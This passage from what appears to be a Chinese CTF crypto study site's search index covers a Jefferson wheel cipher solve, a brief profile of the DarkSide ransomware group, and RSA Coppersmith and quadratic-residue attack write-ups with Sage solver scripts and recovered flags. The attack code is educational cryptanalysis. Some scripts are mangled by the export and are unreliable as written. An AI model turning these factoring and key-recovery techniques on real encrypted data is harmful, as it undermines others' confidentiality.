<p></p>"},{"location":"Crypto/Chapter5/5-2/","title":"\u6770\u6590\u900a\u8f6c\u8f6e\u5bc6\u7801","text":""},{"location":"Crypto/Chapter5/5-2/#\u6770\u6590\u900a\u8f6c\u8f6e\u5bc6\u7801","title":"\u6770\u6590\u900a\u8f6c\u8f6e\u5bc6\u7801","text":"<p>\u52a0\u5bc6\u6b65\u9aa4\uff1a</p> <ol> <li>\u660e\u6587\u5bf9\u9f50\uff1a</li> <li>\u5c06\u5706\u76d8\u6309\u9884\u5b9a\u987a\u5e8f\u6392\u5217\u540e\uff0c\u65cb\u8f6c\u6bcf\u4e2a\u5706\u76d8\uff0c\u4f7f\u660e\u6587\u7684\u5b57\u6bcd\u5728\u4e00\u6761\u76f4\u7ebf\u4e0a\uff08\u4f8b\u5982\u6c34\u5e73\u5bf9\u9f50\uff09</li> <li>\u4f8b\u5982\uff1a\u52a0\u5bc6\u660e\u6587 \"HELLO\"\uff0c\u9700\u5c06\u7b2c1\u4e2a\u5706\u76d8\u8f6c\u5230 \"H\"\uff0c\u7b2c 2 \u4e2a\u5706\u76d8\u8f6c\u5230 \"E\"\uff0c\u4f9d\u6b64\u7c7b\u63a8</li> <li>\u9009\u62e9\u5bc6\u6587\u884c\uff1a</li> <li>\u5728\u5bf9\u9f50\u660e\u6587\u7684\u540c\u4e00\u8f74\u4e0a\uff0c\u9009\u62e9\u4efb\u610f\u5176\u4ed6\u884c\u7684\u5b57\u6bcd\u4f5c\u4e3a\u5bc6\u6587\uff08\u901a\u5e38\u53d1\u9001\u8005\u4f1a\u6307\u5b9a\u4f7f\u7528\u54ea\u4e00\u884c\u7684\u504f\u79fb\u91cf\uff0c\u4f8b\u5982 \"\u4e0a\u4e00\u884c\" \u6216 \"\u4e0b\u4e00\u884c\"\uff09</li> <li>\u4f8b\u5982\uff1a\u82e5\u660e\u6587\u884c\u662f\u7b2c 5 \u884c\uff0c\u5bc6\u6587\u53ef\u80fd\u9009\u81ea\u7b2c 12 \u884c\u7684\u5b57\u6bcd</li> <li>\u751f\u6210\u5bc6\u6587\uff1a</li> <li>\u5c06\u9009\u5b9a\u7684\u5bc6\u6587\u884c\u5b57\u6bcd\u6309\u987a\u5e8f\u8bfb\u51fa\uff0c\u5f62\u6210\u5bc6\u6587</li> </ol> <p>\u89e3\u5bc6\u6b65\u9aa4\uff1a</p> <ol> <li>\u5706\u76d8\u6392\u5217\uff1a</li> <li>\u63a5\u6536\u8005\u6309\u76f8\u540c\u987a\u5e8f\u6392\u5217\u5706\u76d8</li> <li>\u5bf9\u9f50\u5bc6\u6587\uff1a</li> <li>\u65cb\u8f6c\u5706\u76d8\uff0c\u4f7f\u5bc6\u6587\u5b57\u6bcd\u5728\u4e00\u6761\u76f4\u7ebf\u4e0a\uff08\u4e0e\u52a0\u5bc6\u65f6\u9009\u5b9a\u7684\u884c\u76f8\u540c\uff09</li> <li>\u6062\u590d\u660e\u6587\uff1a</li> <li>\u660e\u6587\u5b57\u6bcd\u4f1a\u51fa\u73b0\u5728\u52a0\u5bc6\u65f6\u5bf9\u9f50\u7684\u884c\uff08\u5982\u7b2c 5 \u884c\uff09</li> </ol> <p>\u6770\u6590\u900a\u8f6c\u8f6e\u52a0\u5bc6\u7279\u70b9\uff1a</p> <pre><code>\u6709\u5bc6\u94a5\u3001\u5bc6\u6587\u53ca\u591a\u884c 26 \u5b57\u6bcd\u7ec4\u6210\n</code></pre> <p>\u6253\u5f00\u6587\u4ef6</p> <p></p> <p>\u5148\u628a\u8fd9 13 \u884c\u6839\u636e\u5bc6\u94a5\u7684\u987a\u5e8f\u6392\u597d</p> <pre><code>2\uff1a KPBELNACZDTRXMJQOYHGVSFUWI \n3\uff1a BDMAIZVRNSJUWFHTEQGYXPLOCK\n7\uff1a GWTHSPYBXIZULVKMRAFDCEONJQ\n5\uff1a IHFRLABEUOTSGJVDKCPMNZQWXY\n13\uff1aJZQAWSXCDERFVBGTYHNUMKILOP\n12\uff1aLVNCMXZPQOWEIURYTASBKJDFHG\n9\uff1a XPLTDSRFHENYVUBMCQWAOIKZGJ\n1\uff1a ZWAXJGDLUBVIQHKYPNTCRMOSFE\n8\uff1a NOZUTWDCVRJLXKISEFAPMYGHBQ\n10\uff1aUDNAJFBOWTGVRSCZQKELMXYIHP\n4\uff1a RPLNDVHGFCUKTEBSXQYIZMJWAO\n11\uff1aMNBVCXZQWERTPOIUYALSKDJFHG\n6\uff1a AMKGHIWPNYCJBFZDRUSLOQXVET\n</code></pre> <p>\u518d\u6839\u636e\u6bcf\u4e00\u4e2a\u5bc6\u6587\uff0c\u5c06\u6bcf\u4e00\u884c\u8c03\u5230\u6b63\u786e\u7684\u4f4d\u7f6e</p> <pre><code>2\uff1a NACZDTRXMJQOYHGVSFUWIKPBEL\n3\uff1a FHTEQGYXPLOCKBDMAIZVRNSJUW\n7\uff1a QGWTHSPYBXIZULVKMRAFDCEONJ\n5\uff1a KCPMNZQWXYIHFRLABEUOTSGJVD\n13\uff1aSXCDERFVBGTYHNUMKILOPJZQAW\n12\uff1aEIURYTASBKJDFHGLVNCMXZPQOW\n9\uff1a VUBMCQWAOIKZGJXPLTDSRFHENY\n1\uff1a OSFEZWAXJGDLUBVIQHKYPNTCRM\n8\uff1a QNOZUTWDCVRJLXKISEFAPMYGHB\n10\uff1aOWTGVRSCZQKELMXYIHPUDNAJFB\n4\uff1a FCUKTEBSXQYIZMJWAORPLNDVHG\n11\uff1aNBVCXZQWERTPOIUYALSKDJFHGM\n6\uff1a PNYCJBFZDRUSLOQXVETAMKGHIW\n</code></pre> <p>\u6d4f\u89c8\u6bcf\u4e00\u884c\uff0c\u53d1\u73b0\u7b2c 18 \u884c\u662f\u6709\u610f\u4e49\u7684</p> <pre><code>firethehole\n</code></pre>"},{"location":"Crypto/Chapter6/","title":"Index","text":""},{"location":"Crypto/Chapter6/#darkside","title":"DarkSide","text":"<p>DarkSide \u7684\u603b\u90e8\u4f4d\u4e8e\u4e1c\u6b27\uff0c\u4f46\u4e0e\u5176\u4ed6\u9ed1\u5ba2\u7ec4\u7ec7\u4e0d\u540c\u7684\u662f\uff0c\u5b83\u5e76\u4e0d\u662f\u7531\u56fd\u5bb6\u652f\u6301\u7684\u9ed1\u5ba2\u7ec4\u7ec7</p> <p>DarkSide \u57fa\u672c\u53ea\u9488\u5bf9\u82f1\u8bed\u56fd\u5bb6\u53d1\u52a8\u7f51\u7edc\u88ad\u51fb</p> <p>DarkSide \u7684\u52d2\u7d22\u8f6f\u4ef6\u5c06\u9ed8\u8ba4\u8bed\u8a00\u8bbe\u7f6e\u4e3a\u4fc4\u8bed\u3001\u4e4c\u514b\u5170\u8bed\u3001\u683c\u9c81\u5409\u4e9a\u8bed\u6216\u767d\u4fc4\u7f57\u65af\u8bed\u7684\u8ba1\u7b97\u673a\u5217\u4e3a\u767d\u540d\u5355\uff0c\u8fd9\u4e9b\u7535\u8111\u4e0d\u4f1a\u88ab\u8be5\u9ed1\u5ba2\u7ec4\u7ec7\u7684\u52d2\u7d22\u8f6f\u4ef6\u653b\u51fb</p> <p>\u5728 DarkSide \u7f51\u7ad9\u7684\u4e00\u4efd\u65b0\u95fb\u7a3f\u4e2d\uff0c\u8be5\u7ec4\u7ec7\u58f0\u79f0\u4ed6\u4eec\u4e0d\u4f1a\u653b\u51fb\u533b\u9662\u3001\u5b89\u5b81\u533b\u9662\u3001\u5b66\u6821\u3001\u5927\u5b66\u3001\u975e\u8425\u5229\u7ec4\u7ec7\u6216\u653f\u5e9c\u90e8\u95e8\u3002\u8be5\u7ec4\u7ec7\u8981\u6c42\u7684\u8d4e\u91d1\u4e00\u822c\u5728 20 \u4e07\u7f8e\u5143\u81f3 200 \u4e07\u7f8e\u5143\u8303\u56f4\u4e4b\u5185\u3002DarkSide \u8fd8\u58f0\u79f0\u4ed6\u4eec\u4f1a\u5c06\u90e8\u5206\u8d4e\u91d1\u6350\u8d60\u7ed9\u6148\u5584\u673a\u6784</p> <p>2020\u5e748\u6708\uff0c\u4eba\u4eec\u9996\u6b21\u6ce8\u610f\u5230\u8be5\u9ed1\u5ba2\u7ec4\u7ec7</p> <p></p>"},{"location":"Crypto/Chapter6/6-1/","title":"\u52a0\u5bc6\u79c1\u94a5 d","text":""},{"location":"Crypto/Chapter6/6-1/#\u52a0\u5bc6\u79c1\u94a5-d","title":"\u52a0\u5bc6\u79c1\u94a5 d","text":"<pre><code>from gmpy2 import *\n\n\np = 473398607161\n\nq = 4511491\n\ne = 17\n\nphi = (q - 1) * (p - 1)\n\nd = invert(e, phi)\n\nprint(d)\n</code></pre>"},{"location":"Crypto/Chapter6/6-10/","title":"Coppersmith \u653b\u51fb\uff08p \u9ad8\u4f4d\u6cc4\u9732\uff09","text":""},{"location":"Crypto/Chapter6/6-10/#coppersmith-\u653b\u51fbp-\u9ad8\u4f4d\u6cc4\u9732","title":"Coppersmith \u653b\u51fb\uff08p \u9ad8\u4f4d\u6cc4\u9732\uff09","text":"<p>from secret import FLAG</p> <p>m = bytes_to_long(FLAG)</p> <p>def getpq(nbit):     p = getPrime(nbit)     q = getPrime(nbit)     if p &gt; q:         return p, q     else:         return q, p</p> <p>p, q = getpq(512) P = (p - q) &amp; ((1 &lt;&lt; 130) - 1) n = p * q</p> <p>leak_p = p &gt;&gt; 256</p> <p>c = pow((1 + P * n), m, n ** 3)</p> <p>print('n =', n) print('leak_p =', leak_p) print(\"c =\", c)</p>"},{"location":"Crypto/Chapter6/6-10/#n--135133139540786818977969958456509467902948924003478556140490841984247464940261764739984274397650928404945721248284577232814352745333641188749824519153271662051302477973525156608141358709265683759057060630360909926255299541198485901065352661702656282587105799982740927802530997159098015074633017964344230291287","title":"n = 135133139540786818977969958456509467902948924003478556140490841984247464940261764739984274397650928404945721248284577232814352745333641188749824519153271662051302477973525156608141358709265683759057060630360909926255299541198485901065352661702656282587105799982740927802530997159098015074633017964344230291287","text":""},{"location":"Crypto/Chapter6/6-10/#leak_p--115314121469787984258489158421056136177545051135641551928888818017665807264468","title":"leak_p = 115314121469787984258489158421056136177545051135641551928888818017665807264468","text":""},{"location":"Crypto/Chapter6/6-10/#c--1836794759996264077871820946090708779709415760553736759453665641907562256633157424959089180650539327925671892742819931875681606982615287882656254828326465758462357812873839261469783652663796071814218493268788421243190729887313099383264588659922912876424206670310928514588754069909128149471326084547056385690037197908766053620702238356084124023146075698878494434053246157524775269473152458661801907641122308756667762880284617915774590075511686821816948174618196839335059944389423693187930672934293905608970421003536691336581450927887931599275461176935079227494931457562345640133982771901848553204154760760399724074615092290799119053032875792219794072963200108352944441876206386518960615891547166767499506114294860833404421893612197040731184031783165365621722947731966143226777081983415797778111715332055871302609049501876860012070502369090417942239749695034267695710324328867728296996779","title":"c = 1836794759996264077871820946090708779709415760553736759453665641907562256633157424959089180650539327925671892742819931875681606982615287882656254828326465758462357812873839261469783652663796071814218493268788421243190729887313099383264588659922912876424206670310928514588754069909128149471326084547056385690037197908766053620702238356084124023146075698878494434053246157524775269473152458661801907641122308756667762880284617915774590075511686821816948174618196839335059944389423693187930672934293905608970421003536691336581450927887931599275461176935079227494931457562345640133982771901848553204154760760399724074615092290799119053032875792219794072963200108352944441876206386518960615891547166767499506114294860833404421893612197040731184031783165365621722947731966143226777081983415797778111715332055871302609049501876860012070502369090417942239749695034267695710324328867728296996779","text":"<pre><code>p \u9ad8\u4f4d\u6cc4\u9732 256 bit\uff0c\u4f46\u662f\u6cc4\u9732\u7684 bit \u4e0d\u591f\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u7206\u7834 8 bit\u624d\u80fd copper \u6062\u590d p\n\n```python\n#sage\nfrom tqdm import *\n\n\nn = 135133139540786818977969958456509467902948924003478556140490841984247464940261764739984274397650928404945721248284577232814352745333641188749824519153271662051302477973525156608141358709265683759057060630360909926255299541198485901065352661702656282587105799982740927802530997159098015074633017964344230291287\n\np_high = 115314121469787984258489158421056136177545051135641551928888818017665807264468\n\nc = 1836794759996264077871820946090708779709415760553736759453665641907562256633157424959089180650539327925671892742819931875681606982615287882656254828326465758462357812873839261469783652663796071814218493268788421243190729887313099383264588659922912876424206670310928514588754069909128149471326084547056385690037197908766053620702238356084124023146075698878494434053246157524775269473152458661801907641122308756667762880284617915774590075511686821816948174618196839335059944389423693187930672934293905608970421003536691336581450927887931599275461176935079227494931457562345640133982771901848553204154760760399724074615092290799119053032875792219794072963200108352944441876206386518960615891547166767499506114294860833404421893612197040731184031783165365621722947731966143226777081983415797778111715332055871302609049501876860012070502369090417942239749695034267695710324328867728296996779\n\npbits = 512\n\nfor i in trange(2**8, 1, -1):\n    # \u8865\u9f50\u9ad8\u4f4d\uff0c\u5e76\u586b\u5145\u4f4e 8 \u4f4d\n    p4 = (p_high &lt;&lt; 8) + i\n\n    # \u8ba1\u7b97\u5269\u4f59\u4f4d\u6570\n    kbits = pbits - p4.nbits()\n\n    # \u5de6\u79fb\u8865\u9f50\u5230 512 \u4f4d\n    p4 = p4 &lt;&lt; kbits\n\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n\n    f = x + p4\n\n    roots = f.small_roots(X = 2^ kbits, beta = 0.4, epsilon = 0.01)\n\n    if roots:        \n        p = p4 + int(roots[0])\n\n        if n % p == 0:\n            print(i, p)\n\n            break\n\n# i = 197\n# p = 13352463043552409670211183534740157814546713901105410408023687926498813469217507846107364405269402732967687839808637375591530105677153038557366731161035343\n</code></pre>"},{"location":"Crypto/Chapter6/6-11/","title":"Coppersmith \u653b\u51fb\uff08CRT\uff09","text":""},{"location":"Crypto/Chapter6/6-11/#coppersmith-\u653b\u51fbcrt","title":"Coppersmith \u653b\u51fb\uff08CRT\uff09","text":"<p>from gmpy2 import * import os</p> <p>flag = b'xxx' def Mypow(b, e, mod):     a = 1     while e:         e &gt;&gt;= 1         b = (b*b)%mod         if e&amp;1:             a = (a*b)%mod     return a</p> <p>def Genp(bit_length):     coeff = 2 ** 5 * 3 * 7     while True:         tmp_prime = getRandomNBitInteger(bit_length - 10)         p = coeff * tmp_prime + 1         if is_prime(p):             break     return p</p> <p>def Genkeys(bit_length):     p,q = Genp(bit_length),Genp(bit_length)     n = p * q     hint = (2 * p + 7 * q) % n     return n, hint</p> <p>if name == 'main':     e = next_prime(666)     n, hint = Genkeys(512)     m = bytes_to_long(os.urandom(30) + flag)     ct = Mypow(m,e,n)     print(f'n = {n}')     print(f'hint = {hint}')     print(f'ct = {ct}')</p> <pre><code>'''\nn = 36443283250594259606482132779262570582448178589602577809591307671554949253094255209079689901493052116793388954529442162972106210862341856282788030374324677114528044629385805693771773377070021111949953333360526159026822968061585876873187059674130307295006486032106471182393880915860569773206853864515489855553\nhint = 57792516722001523643789088224096258172899052039145876393373730235406451592173971020702024058282699663364267742428240581839287357212741266617791207580236457\nct = 24482128269957355675512496312977308128712253968496848873519792376434347925427116612997489113223781321628516365811583310346553402215907938918891908853234881284620764982626375301219763593402089309909155204943747718536894186749932544428588048770663458669109073657836937287831725958017345747881678942488157429000\n'''\n</code></pre> <p><code>$$ \\begin{aligned} &amp;\\because\\ 2\\ *\\ p\\ +\\ 7\\ *\\ q\\\\ &amp;\\therefore\\ 2\\ *\\ p^2\\ +\\ 7\\ *\\ q\\ *\\ p\\\\ &amp;\\therefore\\ p(2p\\ +\\ 7q)\\ =\\ p\\ *\\ hint\\\\ &amp;\\therefore\\ f\\ =\\ 2x^2\\ +\\ 7n\\ -\\ x\\ *\\ hint\\\\\\\\ &amp;If\\ e \\ is\\ even\\\\ &amp;Mypow(b,e,mod)\\ =\\ pow(m,e,n)\\\\ &amp;But\\ if\\ e\\ is\\ odd\\ number\\\\ &amp;Mypow(b,e,mod)\\ =\\ pow(m,e-1,n)\\\\ &amp;\\because\\ e\\ =\\ nextprime(666)\\\\ &amp;\\therefore\\ e\\ is\\ odd\\ number\\\\ &amp;\\therefore\\ e\\ =\\ next_prime(666)\\ -\\ 1\\\\ &amp;\\therefore\\ gcd(e,phi)\\ =\\ e\\\\ \\end{aligned} $$</code>python</p>"},{"location":"Crypto/Chapter6/6-11/#\u56e0\u6b64\u6f14\u53d8\u4e3a\u6709\u9650\u57df\u4e0b\u5f00\u6839\u95ee\u9898","title":"\u56e0\u6b64\u6f14\u53d8\u4e3a\u6709\u9650\u57df\u4e0b\u5f00\u6839\u95ee\u9898","text":""},{"location":"Crypto/Chapter6/6-11/#\u5206\u522b\u5728-gfpgfq-\u4e0a\u5f00-e-\u6b21\u65b9\u6839\u4e4b\u540e-crt-\u7ec4\u5408\u4e00\u4e0b\u6c42\u51fa\u6240\u6709\u7684-m\u518d\u5224\u65ad\u5b57\u7b26\u4e32\u4e2d\u662f\u5426\u542b\u6709-dasctf-\u5373\u53ef\u5f97\u5230-flag","title":"\u5206\u522b\u5728 GF(p),GF(q) \u4e0a\u5f00 e \u6b21\u65b9\u6839\uff0c\u4e4b\u540e crt \u7ec4\u5408\u4e00\u4e0b\uff0c\u6c42\u51fa\u6240\u6709\u7684 m\uff0c\u518d\u5224\u65ad\u5b57\u7b26\u4e32\u4e2d\u662f\u5426\u542b\u6709 DASCTF \u5373\u53ef\u5f97\u5230 flag","text":""},{"location":"Crypto/Chapter6/6-11/#sage","title":"sage","text":"<p>import gmpy2 from Crypto.Util.number import  *  n = 36443283250594259606482132779262570582448178589602577809591307671554949253094255209079689901493052116793388954529442162972106210862341856282788030374324677114528044629385805693771773377070021111949953333360526159026822968061585876873187059674130307295006486032106471182393880915860569773206853864515489855553 hint = 57792516722001523643789088224096258172899052039145876393373730235406451592173971020702024058282699663364267742428240581839287357212741266617791207580236457 ct = 24482128269957355675512496312977308128712253968496848873519792376434347925427116612997489113223781321628516365811583310346553402215907938918891908853234881284620764982626375301219763593402089309909155204943747718536894186749932544428588048770663458669109073657836937287831725958017345747881678942488157429000  R. = Zmod()[] f = 2*x^2 + 7*n - hint*x p = int(f.roots()[0][0]) q = n//p  e = gmpy2.next_prime(666)-1  R. = Zmod(p)[] f = x^e-ct f = f.monic() results1 = f.roots()  R. = Zmod(q)[] f = x^e-ct f = f.monic() results2 = f.roots()  for i in results1:     for j in results2:         param1 = [int(i[0]),int(j[0])]         param2 = [p,q]         m = CRT_list(param1,param2)         flag = long_to_bytes(int(m))         if b'DASCTF' in flag:             print(flag)             break ```"},{"location":"Crypto/Chapter6/6-12/","title":"Coppersmith \u653b\u51fb\uff08\u4e8c\u6b21\u5269\u4f59\uff09","text":""},{"location":"Crypto/Chapter6/6-12/#coppersmith-\u653b\u51fb\u4e8c\u6b21\u5269\u4f59","title":"Coppersmith \u653b\u51fb\uff08\u4e8c\u6b21\u5269\u4f59\uff09","text":"<p>\u9898\u76ee\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from sympy import isprime\nfrom sympy.ntheory import legendre_symbol\nimport random\nfrom Crypto.Util.number import bytes_to_long\n\nk=79    #&lt;-- i couldn't stress more\n\ndef get_p():\n    global k\n    while True:\n        r=random.randint(2**69,2**70)\n        p=2**k*r+1\n        if isprime(p):\n            return p\n        else:\n            continue\n\ndef get_q():\n    while True:\n        r=random.randint(2**147,2**148)\n        q=4*r+3\n        if isprime(q):\n            return q\n        else:\n            continue\n\n\ndef get_y():\n    global n,p,q\n    while True:\n        y=random.randint(0,n-1)\n        if legendre_symbol(y,p)==1:\n            continue\n        elif legendre_symbol(y,q)==1:\n            continue\n        else:\n            return y\n\n\nflag=b'DASCTF{redacted:)}'\nflag_pieces=[flag[0:10],flag[11:21],flag[22:32],flag[33:43],flag[44:]]\n#assert int(bytes_to_long((flag_pieces[i] for i in range(5)))).bit_length()==k\n\np=get_p()\nq=get_q()\nn=p*q\nprint(f'{n=}')\n\ny=get_y()\nprint(f'{y=}')\n\n\ndef encode(m):\n    global y,n,k\n    x = random.randint(1, n - 1)\n    c=(pow(y,m,n)*pow(x,pow(2,k),n))%n\n    return c\n\ncs=[]\nfor i in range(len(flag_pieces)):\n    ci=encode(bytes_to_long(flag_pieces[i]))\n    cs.append(ci)\n\nprint(f'{cs=}')\n\n'''\nn=542799179636839492268900255776759322356188435185061417388485378278779491236741777034539347\ny=304439269593920283890993394966761083993573819485737741439790516965458877720153847056020690\ncs=[302425991290493703631236053387822220993687940015503176763298104925896002167283079926671604, 439984254328026142169547867847928383533091717170996198781543139431283836994276036750935235, 373508223748617252014658136131733110314734961216630099592116517373981480752966721942060039, 246328010831179104162852852153964748882971698116964204135222670606477985487691371234998588, 351248523787623958259846173184063420603640595997008994436503031978051069643436052471484545]\n'''\n</code></pre> <p>\u56e0\u4e3a p = 2 ^ k * r + 1\uff0c\u8fd9\u4e2a r \u53ea\u6709 70 \u4f4d</p> <pre><code>k = 79\nP.&lt;x&gt; = PolynomialRing(Zmod(n))\nf = 2^k*x + 1\nres = f.monic().small_roots(X=2^70, beta=0.499, epsilon=0.02)\np = int(f(res[0]))\n# 628729403897154553626034231171921094272614401\n</code></pre> <pre><code>y \u662f\u4e00\u4e2a\u968f\u673a\u6570\uff0c\u4e14\u6ee1\u8db3\u5bf9 p \u548c q \u90fd\u4e0d\u662f\u4e8c\u6b21\u5269\u4f59\n\n\u8fd9\u610f\u5473\u7740 y \u7684 **\u52d2\u8ba9\u5fb7\u7b26\u53f7**\uff08Legendre symbol\uff09\u5bf9 p \u548c q \u90fd\u4e0d\u4e3a 1\n</code></pre> \\[ \\begin{aligned} (\\frac{y}{p})\\ =\\ -1,\\ (\\frac{y}{q})\\ =\\ -1 \\end{aligned} \\] <pre><code>\u628a flag \u5206\u6210 5 \u5757\u6bcf\u5757 10 \u5b57\u8282\uff0879 \u4f4d\uff0c\u4e0e k \u76f8\u540c\uff09\n\n\u5bc6\u6587 C \u7684\u5f62\u5f0f\u5982\u4e0b\n</code></pre> \\[ \\begin{aligned} c\\ =\\ y^m\\ *\\ rand^{2^k}\\ (mod\\ n) \\end{aligned} \\] <pre><code>\u7531\u4e8e rand^2^k \u662f\u4e8c\u6b21\u5269\u4f59\uff0cc \u7684\u4e8c\u6b21\u5269\u4f59\u6027\u5b8c\u5168\u7531 y^m \u51b3\u5b9a\n\n\u56e0\u6b64\uff0cc \u7684\u4e8c\u6b21\u5269\u4f59\u6027\u53ef\u4ee5\u76f4\u63a5\u53cd\u6620 m \u7684\u5947\u5076\u6027\n\nJacobi \u7b26\u53f7\u662f\u52d2\u8ba9\u5fb7\u7b26\u53f7\u7684\u63a8\u5e7f\uff0c\u7528\u4e8e\u5224\u65ad\u4e00\u4e2a\u6570\u662f\u5426\u662f\u6a21\u67d0\u4e2a\u5947\u6570\u7684\u4e8c\u6b21\u5269\u4f59\n\nn = q * p\uff0c\u800c p \u548c q \u90fd\u662f\u7d20\u6570\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528 Jacobi \u7b26\u53f7\u6765\u5224\u65ad c \u662f\u5426\u662f\u6a21 p \u6216 q \u7684\u4e8c\u6b21\u5269\u4f59\n\n\u901a\u8fc7 Jacobi \u7b26\u53f7\u5224\u65ad m \u7684\u5f53\u524d\u4e8c\u8fdb\u5236\u4f4d\uff080 \u6216 1\uff09\n\n\u5982\u679c\u662f 1 \u5219\u66f4\u65b0\u5e76\u7ee7\u7eed\u9012\u5f52\n\n\u5982\u679c\u662f 0\uff0c\u5219\u76f4\u63a5\u5bf9 c \u5f00\u5e73\u65b9\u6839\uff0c\u7ee7\u7eed\u9012\u5f52\n\n\u5f53\u6062\u590d\u7684\u4e8c\u8fdb\u5236\u4f4d\u957f\u5ea6\u8fbe\u5230 k = 79 \u65f6\uff0c\u9012\u5f52\u7ed3\u675f\uff0c\u8f93\u51fa\u6062\u590d\u7684 m\n\n\u867d\u7136 c \u662f\u6a21 n \u7684\uff0c\u4f46 Jacobi \u7b26\u53f7\u53ea\u80fd\u7528\u4e8e\u6a21\u7d20\u6570\n\n\u56e0\u6b64\uff0c\u9700\u8981\u9009\u62e9\u4e00\u4e2a\u56e0\u5b50\uff08\u5982 p\uff09\u6765\u8ba1\u7b97 Jacobi \u7b26\u53f7\n\n\u5728\u6a21 p \u7684\u60c5\u51b5\u4e0b\uff0c\u65b9\u7a0b x^2 = c (mod p) \u6709\u4e24\u4e2a\u89e3\n\n\u56e0\u6b64\uff0c\u6bcf\u6b21\u5f00\u5e73\u65b9\u6839\u540e\uff0c\u9700\u8981\u9012\u5f52\u904d\u5386\u4e24\u4e2a\u53ef\u80fd\u7684\u6839\n</code></pre> <pre><code>from gmpy2 import jacobi,invert \n\ndef rabin(c):\n    P.&lt;x&gt; = PolynomialRing(GF(p))\n    f1 = x^2 - c\n    resp = f1.roots()\n    return [int(i[0]) for i in resp]\n\ndef getm(c,m):\n    global ok,flag\n    if ok: return \n\n    if len(m)&gt;=k:\n        print('OK',m, long_to_bytes(int(m,2)))\n        flag += long_to_bytes(int(m,2))\n        ok = True\n        return\n\n    if jacobi(c, p) == -1:\n        m = '1'+m\n        c = int(c*invert(y,p)%p)\n    else:\n        m = '0'+m\n    cs = rabin(c)\n    for tc in cs:\n        getm(int(tc),m)\n\nflag = b''\nfor tc in cs:\n    ok = False\n    getm(tc,'')\n\nprint(flag)\n#DASCTF{go0_j06!let1sm0v31n_t0_th3r_chanlenges~&gt;_&lt;}\n</code></pre>"},{"location":"Crypto/Chapter6/6-13/","title":"\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff08\u79bb\u6563\u6570\u5b66\uff09","text":""},{"location":"Crypto/Chapter6/6-13/#\u8d39\u9a6c\u5c0f\u5b9a\u7406\u79bb\u6563\u6570\u5b66","title":"\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff08\u79bb\u6563\u6570\u5b66\uff09","text":"<pre><code>from Crypto.Util.number import bytes_to_long, getPrime\nfrom sympy import nextprime, gcd\nfrom random import randint\nfrom CustomNiBoLan import get_pDNF, get_pCNF\nfrom secret import flag, random_proposition\nimport sys\n\n\nclass Godel:\n    def __init__(self):\n        self.table = ['\ufe41', '\u2228', '\u2227', '\u2192', '\u2194', 's', '(', ')', 'p', 'q', 'r', 't']\n        self.dict = self.generate_dict()\n\n    def generate_dict(self, max_value=30):\n        res = {}\n        used = set()\n\n        for k in self.table:\n            while True:\n                r = randint(1, max_value)\n                if r not in used:\n                    res[k] = r\n                    used.add(r)\n                    break\n\n        return res\n\n    def generate_primes(self, count, start=2):\n        primes = []\n        tmp = start\n\n        while len(primes) &lt; count:\n            primes.append(tmp)\n            tmp = nextprime(tmp)\n\n        return primes\n\n    # zip(seq, p) \u5c06\u5e8f\u5217 seq \u548c\u7d20\u6570\u5217\u8868 p \u7ec4\u5408\u6210\u4e00\u4e2a\u53ef\u8fed\u4ee3\u7684\u5bf9\u8c61\uff0c\u6bcf\u6b21\u8fed\u4ee3\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4 (c, prime)\uff0c\u5176\u4e2d c \u662f seq \u4e2d\u7684\u5143\u7d20\uff0cprime \u662f p \u4e2d\u5bf9\u5e94\u7684\u7d20\u6570\n    def translate(self, seq):\n        p = self.generate_primes(len(seq))\n        gn = 1\n        for c, prime in zip(seq, p):\n            gn *= prime ** self.dict[c]\n        return gn\n\n\ndef encrypt(para):\n    p = nextprime(para)\n    q = getPrime(512)\n    e = 65537\n    n = p * q\n    m = bytes_to_long(flag)\n    c = pow(m, e, n)\n    return c, n\n\n\nif __name__ == '__main__':\n    g = Godel()\n\n    plaint = input(\"\u8bf7\u8f93\u5165\u547d\u9898\uff0c\u4f8bp\u2227q\uff08\u6700\u591a\u56db\u4e2a\u53d8\u91cf\uff09\uff1a\")\n\n    conj = get_pCNF(plaint)\n    disj = get_pDNF(plaint)\n    reslist = [g.translate(conj), g.translate(disj)]\n\n    p = g.translate(random_proposition)\n    c, n = encrypt(p)\n    print(random_proposition)\n    print(f'c: {c}')\n    print(f'n: {n}')\n    print(f'tip: {gcd(*reslist)}')\n</code></pre> <p>1. \u57fa\u672c\u6982\u5ff5\uff1a\u5e03\u5c14\u903b\u8f91\u548c\u547d\u9898\u516c\u5f0f</p> <ul> <li>**\u547d\u9898\uff1a**\u662f\u4e00\u4e2a\u9648\u8ff0\uff0c\u53ef\u4ee5\u4e3a\u771f\uff08True\uff09\u6216\u5047\uff08False\uff09\uff0c\u4f8b\u5982\uff0c\u201c\u4eca\u5929\u662f\u661f\u671f\u4e00\u201d\u662f\u4e00\u4e2a\u547d\u9898</li> <li>**\u547d\u9898\u53d8\u91cf\uff1a**\u901a\u5e38\u7528\u5b57\u6bcd\u8868\u793a\u547d\u9898\uff0c\u4f8b\u5982 A\u3001B\u3001C \u7b49\uff0c\u6bcf\u4e2a\u53d8\u91cf\u90fd\u53ef\u4ee5\u662f True \u6216 False</li> </ul> <p>\u5e03\u5c14\u903b\u8f91\u4e2d\u7684\u57fa\u672c\u8fd0\u7b97\u5305\u62ec</p> <ul> <li>\u4e0e\uff08AND\uff09\uff0c\u8bb0\u4f5c \u2227\uff0c\u8868\u793a\u4e24\u4e2a\u547d\u9898\u540c\u65f6\u4e3a\u771f\u65f6\u7ed3\u679c\u624d\u4e3a\u771f</li> <li>\u6216\uff08OR\uff09\uff0c\u8bb0\u4f5c \u2228\uff0c\u8868\u793a\u81f3\u5c11\u6709\u4e00\u4e2a\u547d\u9898\u4e3a\u771f\u65f6\u7ed3\u679c\u4e3a\u771f</li> <li>\u975e\uff08NOT\uff09\uff0c\u8bb0\u4f5c \u00ac\uff0c\u8868\u793a\u5bf9\u547d\u9898\u53d6\u53cd\uff0c\u5373\u771f\u53d8\u5047\uff0c\u5047\u53d8\u771f</li> </ul> <p>\u4f8b\u5982\uff1a</p> <ul> <li>A\u2227B \u53ea\u6709\u5f53 A \u548c B \u90fd\u4e3a\u771f\u65f6\u624d\u4e3a\u771f</li> <li>A\u2228B \u53ea\u8981 A \u6216 B 